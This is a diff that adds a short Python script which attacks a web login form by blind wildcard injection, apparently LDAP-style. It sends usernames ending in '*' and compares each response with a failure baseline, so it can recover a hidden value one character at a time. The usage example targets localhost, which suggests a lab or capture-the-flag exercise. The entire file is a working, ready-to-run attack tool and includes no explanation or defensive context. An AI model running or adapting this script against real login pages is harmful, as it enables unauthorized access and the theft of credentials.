@@ -1,0 +1,40 @@
+#!/usr/bin/env python3
+
+# imports
+import requests
+import os
+import sys
+
+# arg
+l=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]
+if (len(sys.argv)==3):
+	url=sys.argv[1] # taking arg as the url/target
+	got=sys.argv[2] # taking initial start letter
+
+elif (len(sys.argv)==2):
+	url=sys.argv[1]
+	got=''
+else:
+	print("Usage: "+str(sys.argv[0])+" http://127.0.0.1/login") # error msg
+	exit()
+
+
+success=requests.post(url,data={'username':'*','password':"*"}).text
+fail=requests.post(url,data={'username':"a",'password':"a"}).text
+
+def run(l,got,success,fail):
+	for c in l:
+		tst=got+c+"*"
+		payload={'username':tst,'password':'*'}
+		t=requests.post(url,data=payload).text
+		if t!=fail:
+			os.system("clear")
+			print("DECODED: "+got+c)
+			got=got+c
+			run(l,got,success,fail)
+			exit()
+		else:
+			os.system("clear")
+			print("Decoding: "+str(got)+str(c))
+	print("Completed")
+run(l,got,success,fail)
